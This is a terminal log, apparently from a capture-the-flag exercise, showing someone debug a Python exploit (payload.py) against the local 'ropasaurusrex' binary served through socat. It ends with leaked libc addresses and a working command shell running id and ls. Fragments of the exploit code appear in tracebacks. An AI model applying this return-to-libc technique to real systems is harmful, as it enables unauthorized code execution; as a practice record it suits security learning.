+      udp-recv:<port>	groups=FD,SOCKET,RANGE,IP4,IP6,UDP
+      udp-recvfrom:<port>	groups=FD,SOCKET,CHILD,RANGE,IP4,IP6,UDP
+      udp-sendto:<host>:<port>	groups=FD,SOCKET,IP4,IP6,UDP
+      udp4-connect:<host>:<port>	groups=FD,SOCKET,IP4,UDP
+      udp4-datagram:<remote-address>:<port>	groups=FD,SOCKET,RANGE,IP4,UDP
+      udp4-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,UDP
+      udp4-recv:<port>	groups=FD,SOCKET,RANGE,IP4,UDP
+      udp4-recvfrom:<host>:<port>	groups=FD,SOCKET,CHILD,RANGE,IP4,UDP
+      udp4-sendto:<host>:<port>	groups=FD,SOCKET,IP4,UDP
+      udp6-connect:<host>:<port>	groups=FD,SOCKET,IP6,UDP
+      udp6-datagram:<host>:<port>	groups=FD,SOCKET,RANGE,IP6,UDP
+      udp6-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP6,UDP
+      udp6-recv:<port>	groups=FD,SOCKET,RANGE,IP6,UDP
+      udp6-recvfrom:<port>	groups=FD,SOCKET,CHILD,RANGE,IP6,UDP
+      udp6-sendto:<host>:<port>	groups=FD,SOCKET,IP6,UDP
+      unix-client:<filename>	groups=FD,SOCKET,NAMED,RETRY,UNIX
+      unix-connect:<filename>	groups=FD,SOCKET,NAMED,RETRY,UNIX
+      unix-listen:<filename>	groups=FD,SOCKET,NAMED,LISTEN,CHILD,RETRY,UNIX
+      unix-recv:<filename>	groups=FD,SOCKET,NAMED,RETRY,UNIX
+      unix-recvfrom:<filename>	groups=FD,SOCKET,NAMED,CHILD,RETRY,UNIX
+      unix-sendto:<filename>	groups=FD,SOCKET,NAMED,RETRY,UNIX
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ socat tcp-listen:1234, bind=0.0.0.0
+^Cshgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ socat tcp-listen:1234, bind=0.0.0.0 exec:./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+2017/08/22 23:43:22 socat[3334] E exactly 2 addresses required (there are 3); use option "-h" for help
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ socat tcp-listen:1234,bind=0.0.0.0 exec:./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ pwd
+/home/shgroup/Desktop/problems/ropasaurusrex
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python3 payload.py 
+  File "payload.py", line 9
+    p = lamda x:struct.pack("<L", x)
+              ^
+SyntaxError: invalid syntax
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python3 payload.py 
+Traceback (most recent call last):
+  File "payload.py", line 1, in <module>
+    import struc
+ImportError: No module named 'struc'
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python3 payload.py 
+Traceback (most recent call last):
+  File "payload.py", line 29, in <module>
+    pay += p(readplt)
+TypeError: Can't convert 'bytes' object to str implicitly
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+Traceback (most recent call last):
+  File "payload.py", line 55, in <module>
+    pay += p("AAAA")
+  File "payload.py", line 9, in <lambda>
+    p = lambda x:struct.pack("<L", x)
+struct.error: cannot convert argument to integer
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+
+^CTraceback (most recent call last):
+  File "payload.py", line 65, in <module>
+    read = up(s.recv(4))
+KeyboardInterrupt
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+^CTraceback (most recent call last):
+  File "payload.py", line 66, in <module>
+    read = up(s.recv(4))
+KeyboardInterrupt
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+Traceback (most recent call last):
+  File "payload.py", line 67, in <module>
+    read = up(s.recv(4))
+  File "payload.py", line 10, in <lambda>
+    up = lambda x:struct.unpack("<L", x)[0]
+struct.error: unpack requires a string argument of length 4
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+Traceback (most recent call last):
+  File "payload.py", line 67, in <module>
+    read = up(s.recv(4))
+  File "payload.py", line 10, in <lambda>
+    up = lambda x:struct.unpack("<L", x)[0]
+struct.error: unpack requires a string argument of length 4
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+  File "payload.py", line 69
+    print("read@got is on " + hex(read))
+        ^
+SyntaxError: invalid syntax
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+
+[No write since last change]
+
+Press ENTER or type command to continue
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+  File "payload.py", line 68
+    read = up(s.recv(4))
+       ^
+SyntaxError: invalid syntax
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+Traceback (most recent call last):
+  File "payload.py", line 67, in <module>
+    print(hex(s.recv(4)))
+TypeError: hex() argument can't be converted to hex
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+
+Traceback (most recent call last):
+  File "payload.py", line 68, in <module>
+    read = up(s.recv(4))
+  File "payload.py", line 10, in <lambda>
+    up = lambda x:struct.unpack("<L", x)[0]
+struct.error: unpack requires a string argument of length 4
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+
+Traceback (most recent call last):
+  File "payload.py", line 68, in <module>
+    read = up(s.recv(4))
+  File "payload.py", line 10, in <lambda>
+    up = lambda x:struct.unpack("<L", x)[0]
+struct.error: unpack requires a string argument of length 4
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+
+
+Press ENTER or type command to continue
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+read@got is on 0xf760c350
+system is on 0xf7572940
+uid=1000(shgroup) gid=1000(shgroup) groups=1000(shgroup),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+read@got is on 0xf768e350
+system is on 0xf75f4940
+uid=1000(shgroup) gid=1000(shgroup) groups=1000(shgroup),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+read@got is on 0xf75e4350
+system is on 0xf754a940
+> id
+
+^CTraceback (most recent call last):
+  File "payload.py", line 76, in <module>
+    print(s.recv(4096))
+KeyboardInterrupt
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi payload.py
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ python payload.py 
+send payload
+read@got is on 0xf76c4350
+system is on 0xf762a940
+> id
+uid=1000(shgroup) gid=1000(shgroup) groups=1000(shgroup),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+
+> ls   
+Desktop
+Documents
+Downloads
+examples.desktop
+Music
+peda
+Pictures
+Public
+randomize_va_space~
+randomize_va_spacy~
+randomize_va_spacz~
+Templates
+Videos
+
+> ^CTraceback (most recent call last):
+  File "payload.py", line 75, in <module>
+    s.send(raw_input("> ") + "\n")
+KeyboardInterrupt
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ls
+core  payload.py  ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ vi ./payload.py 
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ 
